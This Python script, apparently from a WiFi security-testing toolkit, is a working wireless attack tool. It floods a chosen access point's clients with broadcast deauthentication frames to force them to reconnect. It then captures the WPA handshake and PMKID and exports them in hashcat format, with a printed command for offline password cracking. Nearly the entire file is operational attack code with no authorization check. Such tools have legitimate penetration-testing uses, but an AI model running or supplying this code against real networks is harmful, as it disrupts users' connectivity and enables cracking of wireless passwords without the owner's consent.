"""
WiFi Security Testing Toolkit — WPA Handshake Capture & Deauth Attack
Targets a specific AP, sends deauth frames, captures the 4-way handshake.
Also supports PMKID capture from RSN IE in EAPOL frame 1.
"""

from __future__ import annotations

import time
import signal
import sys
import subprocess
import os
from pathlib import Path
from dataclasses import dataclass, field
from typing import Optional

from scapy.all import (
    sniff, sendp,
    RadioTap, Dot11, Dot11Deauth, Dot11Elt,
    EAPOL, Raw,
    conf as scapy_conf
)
from monitor import InterfaceManager


@dataclass
class HandshakeCapture:
    bssid: str
    station: str
    ssid: str = ""
    anonce: bytes = b""
    snonce: bytes = b""
    mic: bytes = b""
    eapol_data: list[bytes] = field(default_factory=list)
    pmkid: bytes | None = None
    captured_at: float = 0.0
    complete: bool = False


class HandshakeCapturer:
    """
    Passive + active WPA handshake capture.

    Modes:
    1. Passive: just listen for handshakes
    2. Active: send deauth frames to force reconnection
    3. PMKID: capture PMKID from AP's EAPOL frame 1 (no client needed)
    """

    def __init__(self, iface: str, target_bssid: str,
                 target_channel: int | None = None,
                 ssid: str = ""):
        self.iface = iface
        self.target = target_bssid.upper()
        self.channel = target_channel
        self.ssid = ssid
        self.captures: dict[str, HandshakeCapture] = {}
        self._running = False
        self._deauth_count = 0

        scapy_conf.verb = 0

    def _set_channel(self) -> None:
        if self.channel:
            InterfaceManager.set_channel(self.iface, self.channel)

    def _is_eapol(self, pkt) -> bool:
        return pkt.haslayer(EAPOL)

    def _extract_eapol_data(self, pkt) -> tuple[str, str, int, bytes] | None:
        dot11 = pkt[Dot11]
        src = dot11.addr2.upper() if dot11.addr2 else ""
        dst = dot11.addr1.upper() if dot11.addr1 else ""

        eapol_layer = pkt[EAPOL]
        raw = bytes(eapol_layer)

        if len(raw) < 5:
            return None

        eapol_type = raw[4]

        return (src, dst, eapol_type, raw)

    def _extract_pmkid(self, eapol_raw: bytes) -> bytes | None:
        """
        PMKID lives in the RSN IE within EAPOL frame 1 (from AP).
        Structure: Tag(1) + Length(1) + OUI(3) + PMKID(16)
        """
        i = 9

        while i < len(eapol_raw) - 2:
            tag = eapol_raw[i]
            length = eapol_raw[i + 1]
            if tag == 0xDD and i + 6 <= len(eapol_raw):
                oui = eapol_raw[i + 2:i + 5]
                if oui == b'\x00\x50\xf2' and eapol_raw[i + 5] == 0x01:
                    pmkid_start = i + 6
                    if pmkid_start + 16 <= i + length + 2:
                        return eapol_raw[pmkid_start:pmkid_start + 16]
            i += length + 2

        return None

    def _process_packet(self, pkt) -> None:
        if not pkt.haslayer(Dot11):
            return

        dot11 = pkt[Dot11]

        addrs = [
            dot11.addr1.upper() if dot11.addr1 else "",
            dot11.addr2.upper() if dot11.addr2 else "",
            dot11.addr3.upper() if dot11.addr3 else "",
        ]
        if self.target not in addrs:
            return

        if not self._is_eapol(pkt):
            return

        result = self._extract_eapol_data(pkt)
        if not result:
            return

        src, dst, eapol_type, raw = result
        now = time.time()

        if src == self.target:
            station = dst
            bssid = src
        elif dst == self.target:
            station = src
            bssid = dst
        else:
            return

        key = f"{bssid}_{station}"

        if key not in self.captures:
            self.captures[key] = HandshakeCapture(
                bssid=bssid, station=station,
                ssid=self.ssid, captured_at=now
            )

        cap = self.captures[key]

        if eapol_type == 1 and bssid == self.target:
            pmkid = self._extract_pmkid(raw)
            if pmkid and not cap.pmkid:
                cap.pmkid = pmkid
                print(f"\n[+] PMKID captured from {self.target}!")

        if eapol_type in (1, 2, 3, 4):
            cap.eapol_data.append(raw)

            if len(raw) >= 81:
                key_nonce = raw[17:49]
                mic = raw[81:97]

                if bssid == self.target:
                    cap.anonce = key_nonce
                else:
                    cap.snonce = key_nonce

                if mic != b'\x00' * 16:
                    cap.mic = mic

            if len(cap.eapol_data) >= 2:
                cap.complete = True

            direction = "AP→STA" if bssid == self.target else "STA→AP"
            print(f"[EAPOL {eapol_type}] {direction} | {bssid} ↔ {station} "
                  f"[{'COMPLETE' if cap.complete else f'{len(cap.eapol_data)}/4'}]")

    def _deauth_attack(self, target_channel: int):
        """Continuously send deauth packets to force reconnection."""
        print(f"[*] Starting deauth attack on {self.target} (channel {target_channel})")
        print("[*] Clients will be disconnected to capture reconnection handshake")

        radiotap = RadioTap()
        dot11 = Dot11(
            type=0, subtype=12,
            addr1="ff:ff:ff:ff:ff:ff",
            addr2=self.target,
            addr3=self.target,
        )
        deauth = Dot11Deauth(reason=7)
        pkt = radiotap / dot11 / deauth

        while self._running:
            try:
                sendp(pkt, iface=self.iface, count=5, inter=0.02, verbose=False)
                self._deauth_count += 5
                time.sleep(0.3)
            except Exception as e:
                print(f"[!] Deauth error: {e}")
                time.sleep(1)

    def capture(self, duration: int = 60, deauth: bool = True,
                pmkid_mode: bool = False) -> list[HandshakeCapture]:
        InterfaceManager.require_root()

        if self.channel:
            InterfaceManager.set_channel(self.iface, self.channel)

        self._running = True

        if deauth and not pmkid_mode and self.channel:
            from threading import Thread
            deauth_thread = Thread(target=self._deauth_attack,
                                   args=(self.channel,), daemon=True)
            deauth_thread.start()

        if pmkid_mode:
            print(f"[*] PMKID capture mode — listening on {self.iface}")
        else:
            print(f"[*] Handshake capture on {self.iface} for {self.target}")
        print(f"[*] Duration: {'continuous' if duration == 0 else f'{duration}s'}")
        print(f"[*] Press Ctrl+C to stop\n")

        signal.signal(signal.SIGINT, lambda s, f: setattr(self, '_running', False))

        try:
            sniff(
                iface=self.iface,
                prn=self._process_packet,
                store=False,
                timeout=duration or None,
            )
        except PermissionError:
            print("[!] Permission denied. Run with sudo.")
            sys.exit(1)

        complete = [c for c in self.captures.values() if c.complete or c.pmkid]
        print(f"\n[*] Capture complete: {len(complete)} handshake(s) / "
              f"{len(self.captures)} partial")
        print(f"[*] Deauth frames sent: {self._deauth_count}")
        return complete

    def save_hashcat(self, path: str | Path) -> int:
        """Export captures in hashcat hc22000 format."""
        lines = []
        for cap in self.captures.values():
            if cap.pmkid:
                ssid_hex = cap.ssid.encode().hex() if cap.ssid else ""
                pmkid_hex = cap.pmkid.hex()
                bssid_hex = cap.bssid.replace(":", "").lower()
                sta_hex = cap.station.replace(":", "").lower()
                line = f"WPA*01*{pmkid_hex}*{bssid_hex}*{sta_hex}*{ssid_hex}***"
                lines.append(line)

            if cap.complete and cap.anonce and cap.snonce:
                ssid_hex = cap.ssid.encode().hex() if cap.ssid else ""
                bssid_hex = cap.bssid.replace(":", "").lower()
                sta_hex = cap.station.replace(":", "").lower()
                anonce_hex = cap.anonce.hex()
                snonce_hex = cap.snonce.hex()
                mic_hex = cap.mic.hex() if cap.mic else "00" * 16
                eapol_hex = b"".join(cap.eapol_data).hex()
                line = (f"WPA*02*{mic_hex}*{bssid_hex}*{sta_hex}*"
                        f"{ssid_hex}*{anonce_hex}*{snonce_hex}*{eapol_hex}***")
                lines.append(line)

        if lines:
            Path(path).write_text("\n".join(lines))
            print(f"[*] Saved {len(lines)} hash(es) to {path}")
            print(f"[*] Crack with: hashcat -m 22000 {path} wordlist.txt")
        return len(lines)


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="WPA Handshake Capture")
    parser.add_argument("iface", help="Monitor mode interface")
    parser.add_argument("bssid", help="Target AP BSSID (MAC)")
    parser.add_argument("-c", "--channel", type=int, required=True,
                        help="Target AP channel")
    parser.add_argument("-s", "--ssid", default="",
                        help="Target SSID (for hashcat export)")
    parser.add_argument("-t", "--time", type=int, default=60,
                        help="Capture duration (seconds, 0=continuous)")
    parser.add_argument("--no-deauth", action="store_true",
                        help="Passive only, no deauth attack")
    parser.add_argument("--pmkid", action="store_true",
                        help="PMKID capture mode (no deauth needed)")
    parser.add_argument("--hashcat", type=str,
                        help="Export to hashcat hc22000 format file")
    args = parser.parse_args()

    capturer = HandshakeCapturer(
        iface=args.iface,
        target_bssid=args.bssid,
        target_channel=args.channel,
        ssid=args.ssid,
    )

    captures = capturer.capture(
        duration=args.time,
        deauth=not args.no_deauth,
        pmkid_mode=args.pmkid,
    )

    if args.hashcat:
        capturer.save_hashcat(args.hashcat)

    if captures:
        for c in captures:
            print(f"\n[+] Handshake: {c.bssid} ↔ {c.station}")
            print(f"    Complete: {c.complete}")
            print(f"    PMKID: {c.pmkid.hex() if c.pmkid else 'None'}")
            print(f"    EAPOL frames: {len(c.eapol_data)}")
    else:
        print("\n[-] No handshakes captured. Try:")
        print("    1. Increasing capture duration")
        print("    2. Moving closer to the AP")
        print("    3. Enabling deauth mode")
        print("    4. Verifying the AP uses WPA2 (not WPA3)")
